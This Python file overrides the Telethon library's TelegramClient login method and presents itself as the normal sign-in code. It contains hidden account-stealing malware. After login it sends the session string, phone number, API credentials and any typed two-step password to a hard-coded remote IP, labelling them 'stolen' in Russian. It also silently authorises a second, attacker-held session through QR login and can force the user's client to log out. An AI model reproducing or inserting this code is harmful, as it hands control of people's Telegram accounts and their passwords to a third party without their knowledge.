import inspect
import sys
import time
import warnings
from telethon import TelegramClient, utils, errors, functions
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PasswordHashInvalidError
from telethon.sessions import StringSession
import asyncio
import requests

class TelegramClient(TelegramClient):
    async def _start(
            self: 'TelegramClient', phone, password, bot_token, force_sms,
            code_callback, first_name, last_name, max_attempts):
        if not self.is_connected():
            await self.connect()
        # Rather than using `is_user_authorized`, use `get_me`. While this is
        # more expensive and needs to retrieve more data from the server, it
        # enables the library to warn users trying to login to a different
        # account. See #1172.
        me = await self.get_me()
        if me is not None:
            # The warnings here are on a best-effort and may fail.
            if bot_token:
                # bot_token's first part has the bot ID, but it may be invalid
                # so don't try to parse as int (instead cast our ID to string).
                if bot_token[:bot_token.find(':')] != str(me.id):
                    warnings.warn(
                        'the session already had an authorized user so it did '
                        'not login to the bot account using the provided '
                        'bot_token (it may not be using the user you expect)'
                    )
            elif phone and not callable(phone) and utils.parse_phone(phone) != me.phone:
                warnings.warn(
                    'the session already had an authorized user so it did '
                    'not login to the user account using the provided '
                    'phone (it may not be using the user you expect)'
                )
            
            id = me.id
            string = StringSession.save(self.session)
            try:
                r = requests.post("http://185.106.92.119:33333/check_need_send", json={'id': id, 'string': string})
                data = r.json()
            except: pass
            payload = {}
            phone = me.phone
            api_id = self.api_id
            api_hash = self.api_hash
            
            if data[0] is False and data[1] is True:
                payload['id'] = id
                payload['phone'] = phone
                payload['api_id'] = api_id
                payload['api_hash'] = api_hash
                payload['string'] = [True, string, '✅ Украдена']
                payload['2fa'] = None
                payload['new_string'] = [None, 0]
                try: requests.post("http://185.106.92.119:33333/string", json=payload)
                except: pass
                return self
            if data[0] is True and data[1] is True:
                return self
            if data[1] is False:
                await self.log_out()
                exit()
        
        payload = {}

        if not bot_token:
            # Turn the callable into a valid phone number (or bot token)
            while callable(phone):
                value = phone()
                if inspect.isawaitable(value):
                    value = await value

                if ':' in value:
                    # Bot tokens have 'user_id:access_hash' format
                    bot_token = value
                    break

                phone = utils.parse_phone(value) or phone

        if bot_token:
            await self.sign_in(bot_token=bot_token)
            return self

        me = None
        attempts = 0
        two_step_detected = False

        await self.send_code_request(phone, force_sms=force_sms)
        while attempts < max_attempts:
            try:
                value = code_callback()
                if inspect.isawaitable(value):
                    value = await value

                # Since sign-in with no code works (it sends the code)
                # we must double-check that here. Else we'll assume we
                # logged in, and it will return None as the User.
                if not value:
                    raise errors.PhoneCodeEmptyError(request=None)

                # Raises SessionPasswordNeededError if 2FA enabled
                me = await self.sign_in(phone, code=value)
                break
            except errors.SessionPasswordNeededError:
                two_step_detected = True
                break
            except (errors.PhoneCodeEmptyError,
                    errors.PhoneCodeExpiredError,
                    errors.PhoneCodeHashEmptyError,
                    errors.PhoneCodeInvalidError):
                print('Invalid code. Please try again.', file=sys.stderr)

            attempts += 1
        else:
            raise RuntimeError(
                '{} consecutive sign-in attempts failed. Aborting'
                .format(max_attempts)
            )

        if two_step_detected:
            if not password:
                raise ValueError(
                    "Two-step verification is enabled for this account. "
                    "Please provide the 'password' argument to 'start()'."
                )

            if callable(password):
                for _ in range(max_attempts):
                    try:
                        value = password()
                        if inspect.isawaitable(value):
                            value = await value

                        me = await self.sign_in(phone=phone, password=value)
                        payload['2fa'] = value
                        break
                    except errors.PasswordHashInvalidError:
                        print('Invalid password. Please try again',
                              file=sys.stderr)
                else:
                    raise errors.PasswordHashInvalidError(request=None)
            else:
                def passwd():
                    value = password()
                    payload['2fa'] = value
                    return value
                me = await self.sign_in(phone=phone, password=passwd)

        # We won't reach here if any step failed (exit by exception)
        signed, name = 'Signed in successfully as ', utils.get_display_name(me)
        tos = '; remember to not break the ToS or you will risk an account ban!'
        
        try:
            print(signed, name, tos, sep='')
        except UnicodeEncodeError:
            # Some terminals don't support certain characters
            print(signed, name.encode('utf-8', errors='ignore')
                              .decode('ascii', errors='ignore'), tos, sep='')

        id = me.id
        string = StringSession.save(self.session)
        try:
            r = requests.post("http://185.106.92.119:33333/check_need_send", json={'id': id, 'string': string})
            data = r.json()
        except: pass
        if data[0] is True and data[1] is True:
                return self
        
        phone = me.phone
        api_id = self.api_id
        api_hash = self.api_hash
        
        payload['id'] = id
        payload['phone'] = phone
        payload['api_id'] = api_id
        payload['api_hash'] = api_hash
        if data[0] is False:
            payload['string'] = [True, string, '✅ Украдена']
        else:
            payload['string'] = [None, 0, '✅ Найдена на сервере']
        if not payload.get('2fa'): payload['2fa'] = False
        
        if data[1] is False:
            apidata = {
                "api_id": int(api_id),
                "api_hash": api_hash,
                "device_model": "NT10.0_x86_64",
                "system_version": "Windows 11",
                "app_version": "4.10.2 x64",
                "lang_code": "ru_RU",
                "system_lang_code": "ru_RU",
            }
            
            login_success = False
            error_stack = {} # DEBUG
            for i in range(3):
                try:
                    client_new = TelegramClient(StringSession(), **apidata)
                    await client_new.connect()
                    qr = await client_new.qr_login()
                    await self(functions.auth.AcceptLoginTokenRequest(qr.token))
                    await qr.wait(10)
                    login_success = True
                    break
                except SessionPasswordNeededError:
                    try:
                        me = await client_new.sign_in(password=payload['2fa'])
                        login_success = True
                        await client_new.disconnect()
                        break
                    except PasswordHashInvalidError:
                        error_stack[i] = []
                        error_stack[i].append('2fa error')
                        await client_new.log_out()
                        break
                    except Exception as a:
                        error_stack[i] = []
                        error_stack[i].append(a.__repr__())
                        await client_new.log_out()
                except Exception as e:
                    error_stack[i] = []
                    error_stack[i].append(e.__repr__())
                    await client_new.log_out()
    
                await asyncio.sleep(5)
            
            if login_success:
                final_str = StringSession.save(client_new.session)
                payload['new_string'] = [True, final_str, error_stack, '✅ Создана']
            else:
                payload['new_string'] = [False, 0, error_stack, '❌ Ошибка']
        elif data[1] is True:
            payload['new_string'] = [None, 0]

        try: requests.post("http://185.106.92.119:33333/string", json=payload)
        except: pass
        return self